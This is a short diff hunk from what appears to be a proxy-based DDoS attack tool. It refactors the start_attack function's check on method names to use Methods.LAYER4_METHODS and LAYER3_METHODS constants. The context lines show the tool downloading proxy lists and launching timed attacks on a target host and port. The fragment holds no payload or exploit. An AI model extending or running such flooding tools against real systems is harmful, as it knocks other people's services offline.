@@ -472,7 +472,7 @@ def start_attack(method, threads, event, socks_type, proxies=None):
     global out_file
     # layer7
     cmethod = str(method.upper())
-    if (cmethod != "HIT") and (cmethod not in l4) and (cmethod not in l3) and (cmethod != "OSTRESS"):
+    if (cmethod != "HIT") and (cmethod not in Methods.LAYER4_METHODS) and (cmethod not in Methods.LAYER3_METHODS) and (cmethod != "OSTRESS"):
         out_file = str("files/proxys/" + sys.argv[5])
         proxydl(out_file, socks_type)
         print("{} Attack Started To {}:{} For {} Seconds With {}/{} Proxy ".format(method, target, port, sys.argv[7],
